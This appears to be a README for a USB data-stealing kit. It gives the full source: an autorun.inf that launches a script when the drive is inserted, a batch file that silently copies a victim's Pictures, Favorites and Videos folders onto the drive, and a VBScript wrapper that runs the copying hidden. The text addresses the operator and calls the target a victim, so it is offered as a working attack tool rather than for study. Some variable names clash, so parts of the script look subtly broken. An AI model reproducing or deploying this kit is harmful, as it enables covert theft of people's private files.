## USB-DATA_STEALER

#### ONCE YOU START THE AUTORUN, YOU CAN ONLY GO BACK WITH DISCONNECT THE USB DRIVER. THINK TWICE! ALSO YOU DON'T HAVE ANY DEFENDER FOR VIRUS AND HARMFUL
#### FILES/FOLDERS COMES FROM VICTIM. THINK TWICE

# start the autorun
###### YOU PRESSED THE RED BUTTON! BE CALM...
## autorun.inf
[autorun]
icon=drive.ico
open=launch.bat
action=Click OK to Run
shell\open\command=launch.bat

## file.bat
@echo off 
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
%backupcmd% "%USERPROFILE%\videos" "%drive%\all\vids"
@echo off
cls

## invisible.vbs
CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False

## launch.bat
wscript.exe \invisible.vbs file.bat